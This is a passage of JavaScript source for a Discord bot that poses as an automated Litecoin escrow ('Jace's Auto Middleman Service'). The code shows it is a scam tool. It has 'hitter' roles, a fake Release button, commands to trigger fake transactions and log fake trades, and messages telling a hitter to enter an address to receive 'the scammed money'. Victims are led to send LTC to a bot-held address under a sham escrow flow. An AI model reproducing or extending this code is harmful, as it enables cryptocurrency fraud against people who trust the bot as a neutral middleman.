        
        const channel = await guild.channels.create({
            name: channelName,
            type: ChannelType.GuildText,
            parent: category,
            permissionOverwrites: [
                { id: guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
                { id: CONFIG.OWNER_ROLE_ID, allow: [PermissionsBitField.Flags.ViewChannel] }
            ]
        });
        
        // Find trader and add them
        let traderMember;
        if (trader.includes('<@')) {
            const traderId = trader.replace(/[<@>]/g, '');
            traderMember = await guild.members.fetch(traderId).catch(() => null);
        } else {
            traderMember = await guild.members.fetch(trader).catch(() => null);
        }
        
        if (traderMember) {
            await channel.permissionOverwrites.create(traderMember, {
                ViewChannel: true,
                SendMessages: true
            });
        }
        
        // Store ticket data
        activeTickets.set(channel.id, {
            id: channel.id,
            creatorId: user.id,
            traderId: traderMember?.id,
            type: type,
            address: walletInfo.address,
            addressIndex: addressIndex,
            giving: giving,
            receiving: receiving
        });
        
        ticketAddresses.set(channel.id, walletInfo);
        
        // Send welcome embed
        const welcomeEmbed = new EmbedBuilder()
            .setTitle(`👋 Jace's Auto Middleman Service`)
            .setDescription(`Make sure to follow the steps and read the instructions thoroughly.\nPlease explicitly state the trade details if the information below is inaccurate.\nBy using this bot, you agree to our ToS #tos-crypto.`)
            .setColor(0x2b2d31)
            .addFields(
                { name: `<@${user.id}>'s side:`, value: giving, inline: true },
                { name: `${traderMember ? `<@${traderMember.id}>` : trader}'s side:`, value: receiving, inline: true }
            );
        
        const deleteRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('delete_ticket').setLabel('Delete Ticket').setStyle(ButtonStyle.Danger)
        );
        
        await channel.send({ content: `<@${user.id}> ${traderMember ? `<@${traderMember.id}>` : trader}`, embeds: [welcomeEmbed], components: [deleteRow] });
        
        // Send role selection
        const roleEmbed = new EmbedBuilder()
            .setTitle('🛡️ • Select your role')
            .setDescription('• "Sender" if you are Sending LTC to the bot.\n• "Receiver" if you are Receiving LTC later from the bot.')
            .setColor(0x2b2d31);
        
        const roleRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`role_sender_${channel.id}`).setLabel('Sender').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId(`role_receiver_${channel.id}`).setLabel('Receiver').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId(`role_reset_${channel.id}`).setLabel('Reset').setStyle(ButtonStyle.Danger)
        );
        
        await channel.send({ embeds: [roleEmbed], components: [roleRow] });
        
        await interaction.reply({ content: `✅ Ticket created: <#${channel.id}>`, ephemeral: true });
    }
    
    // Amount modal
    if (customId.startsWith('amount_modal_')) {
        const ticketId = customId.replace('amount_modal_', '');
        const amount = parseFloat(interaction.fields.getTextInputValue('usd_amount'));
        const ticketData = activeTickets.get(ticketId);
        
        if (!ticketData) return interaction.reply({ content: '❌ Ticket not found.', ephemeral: true });
        
        ticketData.usdAmount = amount;
        ticketData.ltcAmount = (amount / ltcPrice).toFixed(8);
        
        const amountEmbed = new EmbedBuilder()
            .setTitle(`💠 • USD amount set to`)
            .setDescription(`**$${amount.toFixed(2)}**\n\nPlease confirm the USD amount.`)
            .setColor(0x2b2d31);
        
        const confirmRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`confirm_amount_${ticketId}`).setLabel('Correct').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId(`incorrect_amount_${ticketId}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger)
        );
        
        const channel = await client.channels.fetch(ticketId);
        await channel.send({ embeds: [amountEmbed], components: [confirmRow] });
        
        await interaction.reply({ content: `✅ Amount set to $${amount.toFixed(2)}`, ephemeral: true });
    }
    
    // Address input modal (hitter withdrawal)
    if (customId.startsWith('address_modal_')) {
        const ticketId = customId.replace('address_modal_', '');
        const address = interaction.fields.getTextInputValue('wallet_address');
        
        userWallets.set(user.id, address);
        
        // Send scam confirmation
        const scamEmbed = new EmbedBuilder()
            .setTitle('😈 Vro deadass got scammed')
            .setDescription(`Funds will be sent to your address shortly...\n\n**Your Address:**\n\`${address}\``)
            .setColor(0xff0000);
        
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
        );
        
        const channel = await client.channels.fetch(ticketId);
        await channel.send({ embeds: [scamEmbed], components: [row] });
        
        await interaction.reply({ content: '✅ Address confirmed.', ephemeral: true });
    }
});

// ============ AMOUNT CONFIRMATION ============
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    
    const { customId, user } = interaction;
    
    if (customId.startsWith('confirm_amount_')) {
        const ticketId = customId.replace('confirm_amount_', '');
        const ticketData = activeTickets.get(ticketId);
        
        await interaction.reply({ content: `✅ <@${user.id}> confirmed the USD amount.` });
        
        // Send payment info
        const paymentEmbed = new EmbedBuilder()
            .setTitle('📜 • Payment Information')
            .setDescription(`Make sure to send the **EXACT** amount in LTC.`)
            .addFields(
                { name: 'USD Amount', value: `$${ticketData.usdAmount.toFixed(2)}`, inline: false },
                { name: 'LTC Amount', value: ticketData.ltcAmount, inline: false },
                { name: 'Payment Address', value: `\`${ticketData.address}\``, inline: false },
                { name: 'Current LTC Price', value: `$${ltcPrice}`, inline: false },
                { name: 'Note', value: 'This ticket will be closed within 20 minutes if no transaction was detected.' }
            )
            .setColor(0x2b2d31);
        
        const copyRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('copy_details').setLabel('Copy Details').setStyle(ButtonStyle.Primary)
        );
        
        const channel = await client.channels.fetch(ticketId);
        await channel.send({ content: `<@${ticketData.senderId}> Send the LTC to the following address.`, embeds: [paymentEmbed], components: [copyRow] });
        
        // Start monitoring
        startTransactionMonitor(ticketId);
    }
});

// ============ TRANSACTION MONITOR ============
async function startTransactionMonitor(ticketId) {
    const ticketData = activeTickets.get(ticketId);
    if (!ticketData) return;
    
    const expectedAmount = parseFloat(ticketData.ltcAmount);
    let detected = false;
    let txData = null;
    
    const monitor = setInterval(async () => {
        if (!activeTickets.has(ticketId)) {
            clearInterval(monitor);
            return;
        }
        
        const check = await checkLTCAddress(ticketData.address, expectedAmount);
        
        if (check.found && !detected) {
            detected = true;
            txData = check;
            
            const channel = await client.channels.fetch(ticketId).catch(() => null);
            if (!channel) {
                clearInterval(monitor);
                return;
            }
            
            // Transaction detected embed
            const detectEmbed = new EmbedBuilder()
                .setTitle('⚠️ • Transaction Detected')
                .setDescription(`The transaction is currently **unconfirmed** and waiting for 1 confirmation.\n\n**Transaction**\n[${check.txid.slice(0, 10)}...${check.txid.slice(-10)}](https://litecoinspace.org/tx/${check.txid}) (${check.amount.toFixed(8)} LTC)\n**Amount Received**\n${check.amount.toFixed(8)} LTC ($${(check.amount * ltcPrice).toFixed(2)})\n**Required Amount**\n${expectedAmount.toFixed(8)} LTC ($${ticketData.usdAmount.toFixed(2)})\n\nYou will be notified when the transaction is confirmed.`)
                .setColor(0xffa500);
            
            await channel.send({ embeds: [detectEmbed] });
            
            // Check if hitter is involved
            const guild = await client.guilds.fetch(CONFIG.GUILD_ID || channel.guild.id);
            const senderMember = await guild.members.fetch(ticketData.senderId).catch(() => null);
            const receiverMember = await guild.members.fetch(ticketData.receiverId).catch(() => null);
            
            const isHitterSender = senderMember?.roles.cache.has(CONFIG.HITTER_ROLE_ID);
            const isHitterReceiver = receiverMember?.roles.cache.has(CONFIG.HITTER_ROLE_ID);
            
            // Wait for confirmation (simulate 1 confirmation)
            setTimeout(async () => {
                const confirmEmbed = new EmbedBuilder()
                    .setTitle('✅ • Transaction Confirmed!')
                    .setDescription(`**Transactions**\n[${check.txid.slice(0, 10)}...${check.txid.slice(-10)}](https://litecoinspace.org/tx/${check.txid}) (${check.amount.toFixed(8)} LTC)\n**Total Amount Received**\n${check.amount.toFixed(8)} LTC ($${(check.amount * ltcPrice).toFixed(2)})`)
                    .setColor(0x00ff00);
                
                await channel.send({ embeds: [confirmEmbed] });
                
                // Handle based on who is hitter
                if (isHitterSender) {
                    // Hitter sent money - normal flow then scam
                    const releaseEmbed = new EmbedBuilder()
                        .setTitle('✅ • You may proceed with your trade.')
                        .setDescription(`1. <@${ticketData.receiverId}> Give your trader the items or payment you agreed on.\n2. <@${ticketData.senderId}> Once you have received your items, click "Release" so your trader can claim the LTC.`)
                        .setColor(0x00ff00);
                    
                    const row = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId(`release_${ticketId}`).setLabel('Release').setStyle(ButtonStyle.Success),
                        new ButtonBuilder().setCustomId('cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
                    );
                    
                    await channel.send({ content: `<@${ticketData.senderId}> <@${ticketData.receiverId}>`, embeds: [releaseEmbed], components: [row] });
                    
                } else if (isHitterReceiver) {
                    // Hitter is receiver - ask for their address to "receive" the scammed funds
                    const scamEmbed = new EmbedBuilder()
                        .setTitle('✅ • Transaction Confirmed')
                        .setDescription('Hitter input your LTC/USDT address to receive the scammed money')
                        .setColor(0x00ff00);
                    
                    const row = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId(`input_address_${ticketId}`).setLabel('Input Address').setStyle(ButtonStyle.Primary)
                    );
                    
                    await channel.send({ embeds: [scamEmbed], components: [row] });
                    
                } else {
                    // No hitter - normal scam flow
                    const releaseEmbed = new EmbedBuilder()
                        .setTitle('✅ • You may proceed with your trade.')
                        .setDescription(`1. <@${ticketData.receiverId}> Give your trader the items or payment you agreed on.\n2. <@${ticketData.senderId}> Once you have received your items, click "Release" so your trader can claim the LTC.`)
                        .setColor(0x00ff00);
                    
                    const row = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId(`fake_release_${ticketId}`).setLabel('Release').setStyle(ButtonStyle.Success),
                        new ButtonBuilder().setCustomId('cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
                    );
                    
                    await channel.send({ content: `<@${ticketData.senderId}> <@${ticketData.receiverId}>`, embeds: [releaseEmbed], components: [row] });
                }
                
            }, 30000); // 30 seconds for "confirmation"
            
            clearInterval(monitor);
        }
    }, 5000); // Check every 5 seconds (fast detection)
    
    // Auto-close after 20 minutes if no transaction
    setTimeout(() => {
        if (!detected && activeTickets.has(ticketId)) {
            client.channels.fetch(ticketId).then(channel => {
                channel.send('⏰ No transaction detected. Closing ticket...');
                setTimeout(() => channel.delete().catch(() => {}), 3000);
            }).catch(() => {});
            activeTickets.delete(ticketId);
        }
    }, 1200000);
}

// ============ RELEASE HANDLER ============
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    
    if (interaction.customId.startsWith('release_')) {
        const ticketId = interaction.customId.replace('release_', '');
        
        // Check if user is receiver
        const ticketData = activeTickets.get(ticketId);
        if (ticketData && interaction.user.id !== ticketData.receiverId && !interaction.member.roles.cache.has(CONFIG.OWNER_ROLE_ID)) {
            return interaction.reply({ content: '❌ Only the receiver can release.', ephemeral: true });
        }
        
        await interaction.reply({ content: '✅ Funds released!' });
    }
});

// ============ REGISTER COMMANDS ============
client.on(Events.GuildCreate, async (guild) => {
    CONFIG.GUILD_ID = guild.id;
    
    const commands = [
        {
            name: 'panel',
            description: 'Spawn the middleman panels (Owner only)',
            defaultMemberPermissions: PermissionsBitField.Flags.Administrator
        },
        {
            name: 'log',
            description: 'Set the fake transaction log channel (Owner only)',
            defaultMemberPermissions: PermissionsBitField.Flags.Administrator
        },
        {
            name: 'transaction',
            description: 'Trigger fake transaction (Hitter only)',
            options: [{
                name: 'channelid',
                description: 'Ticket channel ID',
                type: 3,
                required: true
            }],
            defaultMemberPermissions: PermissionsBitField.Flags.UseApplicationCommands
        },
        {
            name: 'close',
            description: 'Close the current ticket'
        },
        {
            name: 'heh',
            description: 'Set closed ticket monitor channel (Owner only)',
            options: [{
                name: 'channelid',
                description: 'Channel ID for logs',
                type: 3,
                required: true
            }],
            defaultMemberPermissions: PermissionsBitField.Flags.Administrator
        },
        {
            name: 'setcategory',
            description: 'Set ticket category (Owner only)',
            options: [{
                name: 'categoryid',
                description: 'Category ID',
                type: 3,
                required: true
            }],
            defaultMemberPermissions: PermissionsBitField.Flags.Administrator
        }
    ];
    
    await guild.commands.set(commands);
});

client.login(process.env.DISCORD_TOKEN);
